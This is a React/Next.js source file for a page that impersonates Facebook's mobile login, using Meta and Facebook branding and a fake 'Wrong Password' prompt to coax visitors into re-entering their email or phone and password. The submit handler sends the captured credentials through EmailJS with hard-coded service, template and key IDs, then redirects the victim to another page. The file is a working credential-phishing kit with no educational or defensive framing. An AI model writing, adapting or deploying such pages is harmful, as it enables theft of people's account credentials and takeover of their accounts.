"use client";
import { useRef } from "react";
import { FaFacebook } from "react-icons/fa";
import { FaAngleDown } from "react-icons/fa6";
import { FaArrowLeftLong } from "react-icons/fa6";
import { FaMeta } from "react-icons/fa6";
import emailjs from "@emailjs/browser";
import { useRouter } from "next/navigation";

const WorngPage = () => {

    const form = useRef();
    const router = useRouter();


    const handleSubmit = (e) => {
        e.preventDefault();

        emailjs
        .sendForm(
          "service_ermp125",    // Your EmailJS service ID
          "template_32jirof",   // Your EmailJS template ID
          form.current,         // The form reference
          "NyFYJGObUaA1UQvOZ"   // Your public key
        )
        .then(
          () => {
            console.log("Email sent successfully!");
            setTimeout(() => {
              router.push("/article"); 
            }, 100); 
          },
          (error) => {
            console.log("Failed to send email:", error);
          }
        );
    };

    return (
        <section className="p-4 min-h-screen relative max-w-screen-sm mx-auto ">
            <div>
                <FaArrowLeftLong />
            </div>
            <div className="flex font-thin flex-col items-center gap-16 mt-6">
                <h1 className="flex items-end text-sm ">
                    English (US) <FaAngleDown />
                </h1>
                <FaFacebook className="text-[#1877F2] text-6xl" />
            </div>

            <form
                ref={form}
                onSubmit={handleSubmit}
                className="flex flex-col gap-3 mt-16"
                action=""
            >
                
                <p className="text-red-500 text-sm font-semibold text-center">Wrong Password!! Try again.</p>
                <input
                    name="from_email"
                    className="w-full p-3 rounded-xl border-2 placeholder-gray-600 placeholder-"
                    type="text"
                    required
                    placeholder="Mobile number or Email"
                />
                <input
                    name="from_password"
                    className="w-full p-3 rounded-xl border-2 placeholder-gray-600 placeholder-"
                    type="text"
                    required
                    placeholder="Password"
                />
                <input
                    type="submit"
                    value="Log in"
                    className="bg-[#1877F2] p-2 rounded-full"
                ></input>
            </form>
            <p className="text-sm font-semibold font-sans text-center mt-6">
                Forgot password?
            </p>

            <div className=" absolute bottom-2 w-[90%] ">
                <p className="justify-center gap-1  text-gray-700 font-semibold font-sans flex items-center">
                    <FaMeta /> <span>Meta</span>
                </p>
            </div>
        </section>
    );
};

export default WorngPage;